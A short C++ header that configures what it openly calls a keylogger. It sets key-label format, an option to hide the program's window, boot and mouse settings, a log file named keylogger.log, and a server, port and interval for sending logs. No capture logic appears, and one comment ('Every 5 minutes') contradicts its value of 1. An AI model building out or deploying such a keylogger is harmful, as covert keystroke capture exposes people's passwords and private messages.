#pragma once
#include <string>

// Configurations
#define FORMAT 0        // 0 = labels, 10 = decimal, 16 = hex
#define VISIBLE       // INVISIBLE or VISIBLE
#define BOOT_WAIT       // BOOT_WAIT or NOWAIT
#define MOUSE_IGNORE    // ignore mouse clicks

const char* const serverName = "localhost";
const char* const resource = "/";
const int intervalMinutes = 1;  // Every 5 minutes
const std::string log_file_name = "keylogger.log";
const int BACKEND_PORT = 8000; 